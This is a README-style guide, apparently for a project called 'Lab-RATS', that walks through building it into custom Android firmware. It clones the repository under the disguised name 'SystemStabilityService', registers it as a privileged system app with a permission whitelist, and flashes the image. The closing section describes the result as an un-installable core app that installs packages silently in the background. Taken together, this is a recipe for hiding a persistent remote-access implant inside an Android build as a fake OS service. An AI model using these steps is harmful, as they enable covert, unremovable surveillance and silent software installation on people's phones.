# 📱 AOSP OEM Firmware Integration Guide

This guide details how to integrate **Lab-RATS** directly into custom Android Open Source Project (AOSP) firmware builds as a **pre-installed system application in the `/system/priv-app/` partition** with privileged `INSTALL_PACKAGES` permission.

---

## 🛠️ Project AOSP Build Files

The repository includes pre-configured AOSP build scripts in the project root:

1. **`Android.bp`** (SoONG Build System - Android 8.0 through Android 15+)
2. **`Android.mk`** (GNU Make Build System - Legacy AOSP Android 7.0 and older)
3. **`app/src/main/res/xml/privapp_permissions.xml`** (Privileged permission whitelist for `/system/etc/permissions/`)

---

## 🚀 Step-by-Step Integration Flow

### Step 1: Copy Lab-RATS into AOSP Vendor/Packages Directory
In your AOSP source tree workspace, clone or place the Lab-RATS repository under `packages/apps/` or `vendor/oem/packages/`:

```bash
cd /path/to/aosp_source/packages/apps/
git clone https://github.com/K4N3CO/Lab-RATS.git SystemStabilityService
```

---

### Step 2: Include Module in Target Product Makefiles
Edit your target OEM product makefile (e.g. `device/<vendor>/<device_name>/device.mk` or `build/target/product/handheld_product.mk`):

Add `SystemStabilityService` and its permission whitelist module to `PRODUCT_PACKAGES`:

```makefile
# Pre-installed OEM System App Integration
PRODUCT_PACKAGES += \
    SystemStabilityService \
    privapp-permissions-com.android.system.stability
```

---

### Step 3: Build AOSP Firmware Image
Initialize the AOSP environment and build the system partition image:

```bash
cd /path/to/aosp_source
source build/envsetup.sh
lunch aosp_<device_codename>-userdebug
m -j$(nproc)
```

During compilation:
* SoONG / GNU Make compiles all Java source files from `app/src/main/java/`.
* Setting `privileged: true` (or `LOCAL_PRIVILEGED_MODULE := true`) instructs the build system to output the app directly into `/system/priv-app/SystemStabilityService/SystemStabilityService.apk`.
* Copies `privapp-permissions-com.android.system.stability.xml` into `/system/etc/permissions/`.

---

### Step 4: Flash Firmware onto Target Device
Flash the compiled AOSP image (`system.img`) onto target hardware using `fastboot`:

```bash
fastboot flash system system.img
fastboot reboot
```

---

## 🔐 Firmware Verification

Upon first boot:
1. Android OS boots up and mounts `/system` read-only.
2. `PackageManagerService` scans `/system/priv-app/` and detects `SystemStabilityService.apk`.
3. Reads `/system/etc/permissions/privapp-permissions-com.android.system.stability.xml` and grants `android.permission.INSTALL_PACKAGES`.
4. The application is now pre-installed as an **un-installable core system application** with zero-prompt background package installation capabilities (`PrivilegedInstaller.java`).
